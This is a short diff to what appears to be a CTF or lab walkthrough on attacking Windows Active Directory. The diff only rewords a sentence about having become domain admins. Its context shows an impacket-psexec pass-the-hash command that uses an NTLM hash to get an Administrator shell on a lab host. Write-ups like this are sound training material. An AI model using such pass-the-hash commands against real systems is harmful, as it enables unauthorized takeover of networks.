@@ -141,7 +141,7 @@ For this we use psexec:
 ```bash
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d  Administrator@10.10.204.28
 ```
-We are already administrators of the domain
+We are already domain admins
 
 ![psexec](https://user-images.githubusercontent.com/47476901/131402932-5a53aa6a-11fc-422e-882d-84737500e182.png)
 
